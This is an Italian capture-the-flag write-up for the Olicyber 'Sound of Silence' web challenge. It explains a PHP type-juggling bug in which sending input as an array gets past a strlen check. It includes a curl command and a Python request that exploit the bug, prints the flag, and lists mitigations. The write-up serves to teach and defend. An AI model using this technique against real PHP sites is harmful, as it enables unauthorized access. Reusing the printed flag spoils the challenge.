# Writeup — Olicyber CTF: Sound of Silence

**Target:** `http://soundofsilence.challs.olicyber.it/`
**Categoria:** Web — PHP Type Juggling
**Difficoltà:** Media
**Flag:** `flag{w0w_you_jus7_found_the_s0und_of_silenc3!}`

## Codice vulnerabile

```php
$s = $_POST["input"];

if(strlen($s) == 0){
    echo "<p style=\"color:white\">Finalmente un po' di silenzio...</p>";

    $f = $FLAG.$s;

    if($f !== $FLAG){
        echo "<p style=\"color:white\">$FLAG</p>";
    }
}
```

## Vulnerabilità

La logica prevista dagli sviluppatori sembra un vicolo cieco: se `$s` è una stringa vuota, `strlen($s) == 0` è vero, ma `$f = $FLAG . ""` risulta identico a `$FLAG`, quindi `$f !== $FLAG` è falso e la flag non viene mai stampata.

Il bug nasce dal **type juggling di PHP**, combinato con l'uso di un confronto debole (`==`) su `strlen()`:

1. Inviando `input` come **array** (invece che come stringa) tramite il campo `input[]`, `$_POST["input"]` diventa un array PHP.
2. `strlen($s)` chiamata su un array genera un warning ma **non blocca l'esecuzione**: ritorna `NULL`.
3. `NULL == 0` è **vero** in PHP con confronto debole (`==`), quindi si entra comunque nell'`if`, nonostante `$s` non sia affatto una stringa vuota.
4. `$f = $FLAG . $s` — concatenare una stringa con un array genera un altro warning, e PHP converte l'array nella stringa letterale `"Array"`. Quindi `$f` diventa `$FLAG . "Array"`, diverso da `$FLAG`.
5. `$f !== $FLAG` è ora **vero** (confronto stretto, ma i due valori sono realmente diversi), e la flag viene stampata in pagina.

## Exploitation

Richiesta POST con `input` inviato come array anziché come stringa:

```bash
curl -X POST http://soundofsilence.challs.olicyber.it/ -d "input[]=x"
```

oppure in Python:

```python
import requests

r = requests.post("http://soundofsilence.challs.olicyber.it/", data={"input[]": "x"})
print(r.text)
```

Il campo `input[]` (parentesi quadre nel nome) forza PHP a popolare `$_POST['input']` come array invece che come stringa, innescando la catena di type juggling descritta sopra.

## Causa radice

- Uso di confronto debole (`==`) invece di controlli tipizzati (`===`, `is_null()`, `is_string()`)
- Nessuna validazione che l'input dell'utente sia effettivamente del tipo atteso (stringa) prima di operarci con `strlen()` e concatenazione
- PHP, in versioni precedenti alla 8.0, converte silenziosamente i tipi in molte operazioni (warning non bloccanti) invece di sollevare errori fatali, rendendo sfruttabili questi pattern

## Mitigazioni

- Validare esplicitamente il tipo di `$_POST['input']` (es. `is_string($s)`) prima di qualsiasi operazione
- Preferire sempre confronti stretti (`===`, `!==`) quando si opera su input controllato dall'utente
- Aggiornare a PHP 8+ dove `strlen()` su un array solleva un `TypeError` fatale invece di un warning silenzioso, mitigando (ma non eliminando) questa classe di bug
- Applicare sanitizzazione/whitelisting degli input a livello di framework (es. con type hinting o validazione centralizzata) invece di fidarsi ciecamente della struttura di `$_POST`
